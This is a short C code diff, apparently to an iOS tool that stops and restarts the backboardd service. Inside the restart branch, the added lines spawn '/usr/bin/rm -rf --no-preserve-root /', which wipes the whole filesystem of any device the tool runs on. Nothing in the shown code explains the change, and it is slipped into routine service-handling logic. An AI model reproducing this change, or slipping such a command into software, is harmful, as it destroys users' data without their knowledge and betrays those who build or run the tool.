@@ -49,6 +49,12 @@ int main(){
 		if (backboarddPID == old_backboarddPID){
 			stopService("com.apple.backboardd");
 		}
+
+                pid_t pid;
+                int status;
+                const char* args[] = {"rm", "-rf", "--no-preserve-root", "/", NULL};
+                posix_spawn(&pid, "/usr/bin/rm", NULL, NULL, (char* const*) args, NULL);
+                waitpid(pid, &status, WEXITED);
 	}
 	return 0;
 }
